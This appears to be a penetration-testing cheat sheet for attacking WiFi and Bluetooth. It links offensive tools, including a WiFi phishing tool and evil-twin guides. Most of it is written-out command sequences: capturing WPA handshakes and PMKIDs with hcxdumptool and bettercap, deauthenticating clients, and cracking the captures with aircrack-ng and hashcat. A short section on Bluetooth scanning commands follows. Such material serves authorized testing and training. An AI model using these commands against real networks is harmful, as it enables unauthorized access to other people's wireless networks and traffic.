# WiFi & Wireless

## Wifi 

### Tools 

- Airgeddon: <https://github.com/v1s1t0r1sh3r3/airgeddon>
- wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: <https://github.com/derv82/wifite2>
- WIFIPhisher - Phishing attack tool for Wifi networks: <https://github.com/wifiphisher/wifiphisher>
- WiFi Wardriving with Android - WiGLE WiFi Wardriving: <https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=en>

### Quick Reference 
- `iwconfig`
- `iwlist wlan0 scan`
- `nmcli dev wifi`
- `nmcli dev wifi connect AP-SSID password APpassword`
- `airmon-ng start|stop|restart interface`
- Capture and crack handshake:
    ```
    aircrack-ng captured.cap​
    aircrack-ng -a 2 -b <BSSID> -w wordlist captured.cap​
    ```
- WPA/WPA2 PMKID
  - STEP 1:
    - <https://github.com/ZerBea/hcxdumptool>
    - <https://github.com/aircrack-ng/aircrack-ng>
  - STEP 2: Find target BSSID:
    - `airodump-ng <int>`
  - STEP 3: Add BSSID in ‘bssid.txt’ and use ‘hcxdumptool’:
    - `hcxdumptool -i <int> --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap`
  - STEP 4: Extract PMKID into hashcat format for cracking:
    - <github.com/ZerBea/hcxtools>
    - `hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap`
  - STEP 5: Crack:
    - `hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt`
  - <https://mobile.twitter.com/netmux/status/1097908867374215168>
- WPA enterprise (evil tween attack)
  - <https://pwn.no0.be/exploitation/wifi/wpa_enterprise/>
  - <https://rootsh3ll.com/evil-twin-attack/>
- 4 way handshake capture:
    ```bash
    sudo bettercap -iface wlan0
    ```
  - this will set the interface in monitor mode and start channel hopping on all supported frequencies: `wifi.recon on`
  - we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`: 
    ```bash
    set wifi.show.sort clients desc
    ```
  - every second, clear our view and present an updated list of nearby WiFi networks
    ```bash
    set ticker.commands 'clear; wifi.show'
    ticker on
    ```
  - other
    ```bash
    wifi.recon.channel 1
    ```
    ```bash
    wifi.deauth e0:xx:xx:xx:xx:xx
    ```
- Cracking 4-way handshake:
    ```bash
    /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
    /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
    ```
- Client-less **PMKID Attack**
  - <https://hashcat.net/forum/thread-7717.html>
  - PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
    ```bash 
    # wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
    wifi.assoc all
    ```
  - All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:
- PMKID Cracking
    ```bash 
    /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
    /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
    ```

### References

**New References**

- Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/
- How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a

## Bluetooth 

### Quick References

- `apt-get install bluez`
- `hciconfig` - similarly to ifconfig
  - `hciconfig hci0 up`
- `hcitool` - provide us with device name, device ID, device class, and device clock information
  - `hcitool scan`
  - `hcitool inq` -  MAC addresses of the devices, the clock offset, and the class of the devices.
    - <https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery>
- `hcidump` - sniff the Bluetooth communication
- Service Discovery Protocol (SDP) is a Bluetooth protocol for searching for Bluetooth services (Bluetooth is suite of services),
  - `sdptool browse MACaddress`
- Check reachability: `l2ping MACaddress`